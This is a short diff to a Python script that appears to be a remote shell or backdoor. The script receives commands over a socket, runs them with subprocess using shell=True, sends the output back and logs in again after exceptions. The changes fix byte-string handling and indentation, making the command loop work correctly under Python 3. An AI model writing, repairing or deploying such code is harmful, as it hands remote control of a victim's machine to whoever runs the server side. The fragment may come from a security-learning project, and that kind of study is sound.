@@ -53,8 +53,8 @@ while True:
         command = client.recv(1024)
         command.decode()
 
-        if command == 'exit':
-                continue
+        if command == b'exit':
+            continue
 
         op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
         output = op.stdout.read()
@@ -62,15 +62,16 @@ while True:
         print('Sending Response')
 
         #print(output + output_error)
-        if output + output_error == '':
-                client.send('no stdout')
+        result = output + output_error
+        if len(result) == 0:
+            client.send(b'no stdout')
         else:
-                client.send(output + output_error)
+            client.send(result)
     except Exception as e:
-            print('Main Loop Exception', e)
-            login_status = False
-            while not login_status:
-                login_status = login()
+        print('Main Loop Exception', e)
+        login_status = False
+        while not login_status:
+            login_status = login()
 
 server.close()
 print('Connection Closed')
